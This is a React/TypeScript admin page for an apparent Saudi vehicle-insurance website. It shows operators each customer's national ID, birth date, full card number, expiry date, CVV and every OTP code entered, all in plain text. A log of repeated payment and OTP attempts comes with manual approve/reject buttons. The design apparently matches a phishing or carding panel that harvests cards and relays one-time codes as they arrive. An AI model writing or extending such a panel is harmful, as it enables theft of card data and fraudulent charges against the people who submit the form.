import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { SidebarProvider } from "@/components/ui/sidebar";
import { AdminSidebar } from "@/components/AdminSidebar";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Loader2, CreditCard, Shield, User, Calendar, Phone, FileText, Check, X } from "lucide-react";
import { Button } from "@/components/ui/button";
import { useToast } from "@/hooks/use-toast";

interface PaymentAttempt {
  id: string;
  card_number: string;
  card_holder_name: string;
  expiry_date: string;
  cvv: string;
  created_at: string;
}

interface OtpAttempt {
  id: string;
  otp_code: string;
  created_at: string;
}

interface CustomerOrder {
  id: string;
  sequence_number: string;
  vehicle_type: string;
  vehicle_purpose: string;
  id_number: string;
  birth_date: string;
  insurance_company: string;
  insurance_price: number;
  card_number: string;
  card_holder_name: string;
  expiry_date: string;
  cvv: string;
  otp_code: string | null;
  otp_verified: boolean;
  status: string;
  created_at: string;
  updated_at: string;
  payment_attempts?: PaymentAttempt[];
  otp_attempts?: OtpAttempt[];
}

const AdminOrders = () => {
  const navigate = useNavigate();
  const [orders, setOrders] = useState<CustomerOrder[]>([]);
  const [loading, setLoading] = useState(true);
  const [processingOrder, setProcessingOrder] = useState<string | null>(null);
  const { toast } = useToast();

  useEffect(() => {
    const checkAuthAndFetchOrders = async () => {
      const { data: { session } } = await supabase.auth.getSession();
      if (!session) {
        navigate("/admin/login");
        return;
      }

      await fetchOrders();
      
      // Subscribe to realtime updates
      const channel = supabase
        .channel('orders-changes')
        .on(
          'postgres_changes',
          {
            event: '*',
            schema: 'public',
            table: 'customer_orders'
          },
          () => {
            fetchOrders();
          }
        )
        .subscribe();

      return () => {
        supabase.removeChannel(channel);
      };
    };

    checkAuthAndFetchOrders();
  }, [navigate]);

  const fetchOrders = async () => {
    try {
      const { data, error } = await supabase
        .from("customer_orders")
        .select("*")
        .order("updated_at", { ascending: false });

      if (error) {
        console.error("Error fetching orders:", error);
      } else {
        // Fetch payment attempts and OTP attempts for each order
        const ordersWithAttempts = await Promise.all(
          (data || []).map(async (order) => {
            // Fetch payment attempts
            const { data: paymentAttempts } = await supabase
              .from("payment_attempts")
              .select("*")
              .eq("order_id", order.id)
              .order("created_at", { ascending: false });

            // Fetch OTP attempts
            const { data: otpAttempts } = await supabase
              .from("otp_attempts")
              .select("*")
              .eq("order_id", order.id)
              .order("created_at", { ascending: false });

            return {
              ...order,
              payment_attempts: paymentAttempts || [],
              otp_attempts: otpAttempts || [],
            };
          })
        );

        console.log("Fetched orders with attempts:", ordersWithAttempts);
        setOrders(ordersWithAttempts);
      }
      setLoading(false);
    } catch (error) {
      console.error("Error fetching orders:", error);
      setLoading(false);
    }
  };

  const formatDate = (date: string) => {
    return new Date(date).toLocaleDateString("ar-SA", {
      year: "numeric",
      month: "long",
      day: "numeric",
      hour: "2-digit",
      minute: "2-digit",
    });
  };

  const getStatusBadge = (status: string, otpVerified: boolean) => {
    if (status === "completed" && otpVerified) {
      return <Badge className="bg-green-500 hover:bg-green-600">مكتمل ✓</Badge>;
    } else if (status === "waiting_approval") {
      return <Badge className="bg-orange-500 hover:bg-orange-600">في انتظار موافقة الدفع</Badge>;
    } else if (status === "waiting_otp_approval") {
      return <Badge className="bg-blue-500 hover:bg-blue-600">في انتظار موافقة OTP</Badge>;
    } else if (status === "approved") {
      return <Badge className="bg-purple-500 hover:bg-purple-600">تمت الموافقة</Badge>;
    } else if (status === "rejected" || status === "otp_rejected") {
      return <Badge variant="destructive">مرفوض</Badge>;
    } else {
      return <Badge variant="secondary">قيد التنفيذ...</Badge>;
    }
  };

  const getCompletionPercentage = (order: CustomerOrder) => {
    let completed = 0;
    const total = 6;
    
    if (order.id_number && order.sequence_number) completed++;
    if (order.vehicle_type && order.vehicle_purpose) completed++;
    if (order.insurance_company && order.insurance_price > 0) completed++;
    if (order.card_number && order.card_holder_name) completed++;
    if (order.expiry_date && order.cvv) completed++;
    if (order.otp_code) completed++;
    
    return Math.round((completed / total) * 100);
  };

  const handleApprove = async (sequenceNumber: string) => {
    setProcessingOrder(sequenceNumber);
    try {
      const { error } = await supabase
        .from("customer_orders")
        .update({ status: "approved" })
        .eq("sequence_number", sequenceNumber);

      if (error) throw error;

      toast({
        title: "تمت الموافقة",
        description: "تم قبول الطلب بنجاح",
      });
    } catch (error) {
      console.error("Error approving order:", error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء الموافقة على الطلب",
        variant: "destructive",
      });
    } finally {
      setProcessingOrder(null);
    }
  };

  const handleReject = async (sequenceNumber: string) => {
    setProcessingOrder(sequenceNumber);
    try {
      const { error } = await supabase
        .from("customer_orders")
        .update({ status: "rejected" })
        .eq("sequence_number", sequenceNumber);

      if (error) throw error;

      toast({
        title: "تم الرفض",
        description: "تم رفض الطلب",
      });
    } catch (error) {
      console.error("Error rejecting order:", error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء رفض الطلب",
        variant: "destructive",
      });
    } finally {
      setProcessingOrder(null);
    }
  };

  const handleOtpApprove = async (sequenceNumber: string) => {
    setProcessingOrder(sequenceNumber);
    try {
      const { error } = await supabase
        .from("customer_orders")
        .update({ 
          status: "completed",
          otp_verified: true 
        })
        .eq("sequence_number", sequenceNumber);

      if (error) throw error;

      toast({
        title: "تمت الموافقة",
        description: "تم قبول رمز التحقق بنجاح",
      });
    } catch (error) {
      console.error("Error approving OTP:", error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء الموافقة على رمز التحقق",
        variant: "destructive",
      });
    } finally {
      setProcessingOrder(null);
    }
  };

  const handleOtpReject = async (sequenceNumber: string) => {
    setProcessingOrder(sequenceNumber);
    try {
      const { error } = await supabase
        .from("customer_orders")
        .update({ status: "otp_rejected" })
        .eq("sequence_number", sequenceNumber);

      if (error) throw error;

      toast({
        title: "تم الرفض",
        description: "تم رفض رمز التحقق",
      });
    } catch (error) {
      console.error("Error rejecting OTP:", error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء رفض رمز التحقق",
        variant: "destructive",
      });
    } finally {
      setProcessingOrder(null);
    }
  };

  return (
    <SidebarProvider>
      <div className="min-h-screen flex w-full">
        <AdminSidebar />
        <main className="flex-1 p-8 bg-gradient-to-br from-background via-muted/20 to-background">
          <div className="max-w-7xl mx-auto">
            <div className="mb-8">
              <h1 className="text-4xl font-bold bg-gradient-to-r from-primary to-accent bg-clip-text text-transparent">
                طلبات العملاء
              </h1>
              <p className="text-muted-foreground mt-2">
                جميع طلبات التأمين المسجلة في النظام - تحديث تلقائي
              </p>
            </div>

            {loading ? (
              <div className="flex justify-center items-center py-12">
                <Loader2 className="h-8 w-8 animate-spin text-primary" />
              </div>
            ) : orders.length === 0 ? (
              <Card className="text-center py-12">
                <CardContent>
                  <Shield className="h-16 w-16 mx-auto mb-4 text-muted-foreground" />
                  <p className="text-muted-foreground">لا توجد طلبات مسجلة حتى الآن</p>
                </CardContent>
              </Card>
            ) : (
              <div className="grid grid-cols-1 gap-6">
                {orders.map((order) => {
                  const completionPercent = getCompletionPercentage(order);
                  
                  return (
                    <Card 
                      key={order.id} 
                      className="hover:shadow-xl transition-all duration-300 border-2 hover:border-primary/30 relative overflow-hidden"
                    >
                      {/* Completion Progress Bar */}
                      <div 
                        className="absolute top-0 left-0 h-1 bg-gradient-to-r from-primary to-accent transition-all duration-500"
                        style={{ width: `${completionPercent}%` }}
                      />

                      <CardHeader className="pb-3 bg-gradient-to-br from-primary/5 to-accent/5">
                        <div className="flex justify-between items-center">
                          <div className="flex items-center gap-3">
                            <div className="bg-primary/10 p-2 rounded-lg">
                              <FileText className="h-5 w-5 text-primary" />
                            </div>
                            <div>
                              <CardTitle className="text-lg mb-1">
                                طلب رقم #{order.sequence_number || "غير محدد"}
                              </CardTitle>
                              <CardDescription className="flex items-center gap-1 text-xs">
                                <Calendar className="h-3 w-3" />
                                {formatDate(order.updated_at)}
                              </CardDescription>
                            </div>
                          </div>
                          <div className="text-right flex flex-col items-end gap-2">
                            {getStatusBadge(order.status, order.otp_verified)}
                            <div className="text-xs text-muted-foreground bg-white px-2 py-1 rounded">
                              {completionPercent}% مكتمل
                            </div>
                          </div>
                        </div>
                      </CardHeader>

                      <CardContent className="pt-4">
                        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                          {/* Customer Info */}
                          <div className="bg-white border border-gray-200 rounded-lg p-3">
                            <h3 className="font-semibold mb-2 flex items-center gap-2 text-sm text-primary">
                              <User className="h-4 w-4" />
                              معلومات العميل
                            </h3>
                            <div className="space-y-1.5 text-xs">
                              <div className="flex justify-between">
                                <span className="text-gray-500">الاسم:</span>
                                <span className="font-medium">{order.card_holder_name || "-"}</span>
                              </div>
                              <div className="flex justify-between">
                                <span className="text-gray-500">رقم الهوية:</span>
                                <span className="font-medium">{order.id_number || "-"}</span>
                              </div>
                              <div className="flex justify-between">
                                <span className="text-gray-500">تاريخ الميلاد:</span>
                                <span className="font-medium">{order.birth_date || "-"}</span>
                              </div>
                              <div className="flex justify-between">
                                <span className="text-gray-500">رقم التسلسل:</span>
                                <span className="font-medium">{order.sequence_number || "-"}</span>
                              </div>
                            </div>
                          </div>

                          {/* Vehicle Info */}
                          <div className="bg-white border border-gray-200 rounded-lg p-3">
                            <h3 className="font-semibold mb-2 flex items-center gap-2 text-sm text-blue-600">
                              <Shield className="h-4 w-4" />
                              معلومات المركبة والتأمين
                            </h3>
                            <div className="space-y-1.5 text-xs">
                              <div className="flex justify-between">
                                <span className="text-gray-500">نوع المركبة:</span>
                                <span className="font-medium">{order.vehicle_type || "-"}</span>
                              </div>
                              <div className="flex justify-between">
                                <span className="text-gray-500">الغرض من المركبة:</span>
                                <span className="font-medium">{order.vehicle_purpose || "-"}</span>
                              </div>
                              <div className="flex justify-between">
                                <span className="text-gray-500">قيمة السيارة:</span>
                                <span className="font-bold text-blue-600">
                                  {order.insurance_price > 0 ? `${(order.insurance_price * 10).toFixed(2)} ﷼` : "-"}
                                </span>
                              </div>
                              <div className="flex justify-between">
                                <span className="text-gray-500">شركة التأمين:</span>
                                <span className="font-medium text-right max-w-[140px] truncate" title={order.insurance_company}>
                                  {order.insurance_company || "-"}
                                </span>
                              </div>
                              <div className="flex justify-between">
                                <span className="text-gray-500">سعر التأمين:</span>
                                <span className="font-bold text-green-600">
                                  {order.insurance_price > 0 ? `${order.insurance_price} ﷼` : "-"}
                                </span>
                              </div>
                            </div>
                          </div>

                          {/* Current Payment Info */}
                          <div className="bg-white border border-gray-200 rounded-lg p-3">
                            <h3 className="font-semibold mb-2 flex items-center gap-2 text-sm text-orange-600">
                              <CreditCard className="h-4 w-4" />
                              بطاقة الدفع الحالية
                            </h3>
                            <div className="space-y-1.5 text-xs">
                              <div className="flex justify-between">
                                <span className="text-gray-500">رقم البطاقة:</span>
                                <span className="font-mono font-medium" dir="ltr">
                                  {order.card_number || "-"}
                                </span>
                              </div>
                              <div className="flex justify-between">
                                <span className="text-gray-500">الاسم:</span>
                                <span className="font-medium truncate max-w-[120px]" title={order.card_holder_name}>
                                  {order.card_holder_name || "-"}
                                </span>
                              </div>
                              <div className="flex justify-between">
                                <span className="text-gray-500">الانتهاء:</span>
                                <span className="font-medium" dir="ltr">{order.expiry_date || "-"}</span>
                              </div>
                              <div className="flex justify-between">
                                <span className="text-gray-500">CVV:</span>
                                <span className="font-mono font-medium">{order.cvv || "-"}</span>
                              </div>
                            </div>
                          </div>

                          {/* Payment Attempts */}
                          <div className="md:col-span-2 lg:col-span-3 space-y-2">
                            <h3 className="font-semibold flex items-center gap-2 text-sm text-orange-600">
                              <CreditCard className="h-4 w-4" />
                              محاولات الدفع ({order.payment_attempts?.length || 0})
                            </h3>
                            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3">
                              {order.payment_attempts && order.payment_attempts.length > 0 ? (
                                order.payment_attempts.map((attempt, index) => (
                                  <div key={attempt.id} className="bg-orange-50 border border-orange-200 rounded-lg p-3">
                                    <div className="flex justify-between items-center mb-2">
                                      <span className="text-xs font-semibold text-orange-600">
                                        محاولة #{order.payment_attempts!.length - index}
                                      </span>
                                      <span className="text-xs text-gray-500">
                                        {formatDate(attempt.created_at)}
                                      </span>
                                    </div>
                                    <div className="space-y-1.5 text-xs">
                                      <div className="flex justify-between">
                                        <span className="text-gray-500">رقم البطاقة:</span>
                                        <span className="font-mono font-medium" dir="ltr">
                                          {attempt.card_number}
                                        </span>
                                      </div>
                                      <div className="flex justify-between">
                                        <span className="text-gray-500">الاسم:</span>
                                        <span className="font-medium truncate max-w-[120px]" title={attempt.card_holder_name}>
                                          {attempt.card_holder_name}
                                        </span>
                                      </div>
                                      <div className="flex justify-between">
                                        <span className="text-gray-500">الانتهاء:</span>
                                        <span className="font-medium" dir="ltr">{attempt.expiry_date}</span>
                                      </div>
                                      <div className="flex justify-between">
                                        <span className="text-gray-500">CVV:</span>
                                        <span className="font-mono font-medium">{attempt.cvv}</span>
                                      </div>
                                    </div>
                                  </div>
                                ))
                              ) : (
                                <div className="bg-gray-50 border border-gray-200 rounded-lg p-3 text-center text-xs text-gray-500">
                                  لا توجد محاولات دفع
                                </div>
                              )}
                            </div>
                          </div>

                          {/* OTP Attempts */}
                          <div className="md:col-span-2 lg:col-span-3 space-y-2">
                            <h3 className="font-semibold flex items-center gap-2 text-sm text-blue-600">
                              <Phone className="h-4 w-4" />
                              محاولات OTP ({order.otp_attempts?.length || 0})
                            </h3>
                            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-3">
                              {order.otp_attempts && order.otp_attempts.length > 0 ? (
                                order.otp_attempts.map((attempt, index) => (
                                  <div key={attempt.id} className="bg-blue-50 border border-blue-200 rounded-lg p-3">
                                    <div className="flex justify-between items-center mb-2">
                                      <span className="text-xs font-semibold text-blue-600">
                                        محاولة #{order.otp_attempts!.length - index}
                                      </span>
                                      <span className="text-xs text-gray-500">
                                        {new Date(attempt.created_at).toLocaleTimeString('ar-SA', {
                                          hour: '2-digit',
                                          minute: '2-digit',
                                        })}
                                      </span>
                                    </div>
                                    <div className="space-y-1.5 text-xs">
                                      <div className="flex justify-between items-center">
                                        <span className="text-gray-500">الكود:</span>
                                        <span className="font-mono font-bold text-lg text-blue-600">
                                          {attempt.otp_code}
                                        </span>
                                      </div>
                                      <div className="text-xs text-gray-500 text-center">
                                        {formatDate(attempt.created_at)}
                                      </div>
                                    </div>
                                  </div>
                                ))
                              ) : (
                                <div className="bg-gray-50 border border-gray-200 rounded-lg p-3 text-center text-xs text-gray-500">
                                  لا توجد محاولات OTP
                                </div>
                              )}
                            </div>
                          </div>
                        </div>

                        {/* Action Buttons */}
                        {order.status === "waiting_approval" && (
                          <div className="flex gap-3 mt-4 pt-4 border-t border-border">
                            <Button
                              onClick={() => handleApprove(order.sequence_number)}
                              disabled={processingOrder === order.sequence_number}
                              className="flex-1 bg-green-600 hover:bg-green-700 h-10"
                            >
                              {processingOrder === order.sequence_number ? (
                                <Loader2 className="h-4 w-4 animate-spin ml-2" />
                              ) : (
                                <Check className="h-4 w-4 ml-2" />
                              )}
                              موافقة - الدفع
                            </Button>
                            <Button
                              onClick={() => handleReject(order.sequence_number)}
                              disabled={processingOrder === order.sequence_number}
                              variant="destructive"
                              className="flex-1 h-10"
                            >
                              {processingOrder === order.sequence_number ? (
                                <Loader2 className="h-4 w-4 animate-spin ml-2" />
                              ) : (
                                <X className="h-4 w-4 ml-2" />
                              )}
                              رفض
                            </Button>
                          </div>
                        )}

                        {order.status === "waiting_otp_approval" && (
                          <div className="flex gap-3 mt-4 pt-4 border-t border-border">
                            <Button
                              onClick={() => handleOtpApprove(order.sequence_number)}
                              disabled={processingOrder === order.sequence_number}
                              className="flex-1 bg-green-600 hover:bg-green-700 h-10"
                            >
                              {processingOrder === order.sequence_number ? (
                                <Loader2 className="h-4 w-4 animate-spin ml-2" />
                              ) : (
                                <Check className="h-4 w-4 ml-2" />
                              )}
                              موافقة - OTP
                            </Button>
                            <Button
                              onClick={() => handleOtpReject(order.sequence_number)}
                              disabled={processingOrder === order.sequence_number}
                              variant="destructive"
                              className="flex-1 h-10"
                            >
                              {processingOrder === order.sequence_number ? (
                                <Loader2 className="h-4 w-4 animate-spin ml-2" />
                              ) : (
                                <X className="h-4 w-4 ml-2" />
                              )}
                              رفض
                            </Button>
                          </div>
                        )}
                      </CardContent>
                    </Card>
                  );
                })}
              </div>
            )}
          </div>
        </main>
      </div>
    </SidebarProvider>
  );
};

export default AdminOrders;
